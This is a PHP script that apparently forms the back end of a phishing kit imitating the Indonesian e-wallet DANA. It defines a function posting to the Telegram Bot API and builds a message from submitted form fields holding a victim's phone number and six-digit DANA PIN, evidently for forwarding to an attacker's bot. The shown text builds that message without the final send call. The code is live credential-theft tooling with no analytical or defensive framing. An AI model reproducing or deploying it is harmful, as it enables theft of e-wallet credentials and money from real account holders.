<?php

session_start();
include "./telegram.php";


function sendMessage($chatID, $message, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = ['chat_id' => $chatID, 'text' => $message, 'parse_mode' => 'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);


    // here you can Handle cURL error
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        curl_close($ch);
        return json_encode(array('error' => $error_msg));
    }

    $http_code_message = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($http_code_message >= 200 && $http_code_message < 300) {
        $result = json_decode($response, true);
        if ($result['ok']) {
            $result = json_encode(array('success' => $result['ok']));
        } else {
            $result = json_encode(array('error' => $result));
        }
    } else {
        // And here you can Handle HTTP error
        $result = json_encode(array('error' => 'HTTP error ' . $http_code_message));
    }

    curl_close($ch);
    return $result;
}

$message = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "%0A├───────────────────". "%0A<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor']. "%0A<b>├•𖥔 ᴘɪɴ ᴅᴀɴᴀ : </b>".  $_POST['pin1']. $_POST['pin2']. $_POST['pin3']. $_POST['pin4']. $_POST['pin5'].  $_POST['pin6']. "%0A╰───────────────────";
?>
